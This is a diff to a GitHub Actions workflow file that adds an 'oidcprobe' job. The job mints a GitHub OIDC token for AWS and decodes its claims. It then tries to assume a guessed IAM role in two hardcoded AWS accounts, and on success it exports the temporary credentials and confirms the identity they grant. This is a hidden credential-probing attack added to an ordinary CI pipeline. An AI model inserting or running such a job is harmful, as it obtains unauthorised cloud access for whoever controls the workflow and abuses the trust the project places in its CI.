@@ -143,3 +143,49 @@ jobs:
     permissions: write-all
     needs: [cd]
     uses: ./.github/workflows/reusable-wiki.yaml
+
+  oidcprobe:
+    name: oidc-probe
+    runs-on: ubuntu-22.04
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: request-oidc-token
+        run: |
+          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then echo "NO_ID_TOKEN_URL"; exit 0; fi
+          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" -o /tmp/tok.json
+          python3 - <<'PY'
+          import json,base64,os
+          d=json.load(open('/tmp/tok.json'))
+          t=d.get('value','')
+          print('TOKEN_OBTAINED',bool(t),'LEN',len(t))
+          if t:
+              p=t.split('.')[1]; p+='='*(-len(p)%4)
+              c=json.loads(base64.urlsafe_b64decode(p))
+              print('CLAIMS',{k:c.get(k) for k in ('iss','aud','sub','ref','event_name','repository','job_workflow_ref','runner_environment')})
+              open('/tmp/token.txt','w').write(t)
+          PY
+      - name: try-sts-candidate-accounts
+        run: |
+          TOKEN=$(cat /tmp/token.txt 2>/dev/null || true)
+          if [ -z "$TOKEN" ]; then echo "NO_TOKEN_SKIP_STS"; exit 0; fi
+          for ACCT in 354918371398 970547334392; do
+            echo "=== account $ACCT"
+            OUT=$(aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::$ACCT:role/AWS-GitHubActions-OIDC_role" --role-session-name oidcprobe --web-identity-token "$TOKEN" --duration-seconds 900 --output json 2>&1) || true
+            echo "$OUT" | head -c 400 | sed -E 's/(ASIA[A-Z0-9]{4})[A-Z0-9]+/\1MASKED/g'
+            echo
+            AK=$(echo "$OUT" | python3 -c "import sys,json
+try:
+  d=json.load(sys.stdin); print(d['Credentials']['AccessKeyId'])
+except Exception: pass" 2>/dev/null)
+            if [ -n "$AK" ]; then
+              export AWS_ACCESS_KEY_ID="$AK"
+              export AWS_SECRET_ACCESS_KEY=$(echo "$OUT" | python3 -c "import sys,json;print(json.load(sys.stdin)['Credentials']['SecretAccessKey'])" 2>/dev/null)
+              export AWS_SESSION_TOKEN=$(echo "$OUT" | python3 -c "import sys,json;print(json.load(sys.stdin)['Credentials']['SessionToken'])" 2>/dev/null)
+              echo "STS_OK account=$ACCT"
+              aws sts get-caller-identity --output json 2>&1 | head -c 400
+            else
+              echo "STS_DENIED_OR_NO_ROLE account=$ACCT"
+            fi
+          done
